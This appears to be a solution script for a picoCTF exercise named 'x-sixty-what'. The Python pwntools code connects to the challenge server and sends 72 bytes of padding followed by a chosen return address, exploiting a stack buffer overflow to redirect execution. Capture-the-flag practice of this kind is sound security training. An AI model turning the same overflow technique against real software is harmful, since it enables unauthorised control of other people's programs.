# x-sixty-what solution

from pwn import *
#context.log_level = "debug" 

dest = p64(4198971) # little-endian (3b 12 40 00 00 00 00 00)
LITTLE_E = 0
BIG_E = 1


def overflow(i):

    print("Buffer size:", i)
    s = remote('saturn.picoctf.net', 50776, timeout=5)

    greet = s.recvuntil(b':')
    print(greet.decode('utf-8'))

    payload = (b'\x55' * i) + dest

    #print("Payload:", payload)
    s.sendline(payload)
    #print("Payload sent")
    resp = s.recvall()
    #resp = s.recv(264)
    print("Response:", resp)
    s.close()

    return resp


f = overflow(72)
print("Answer:",str(f))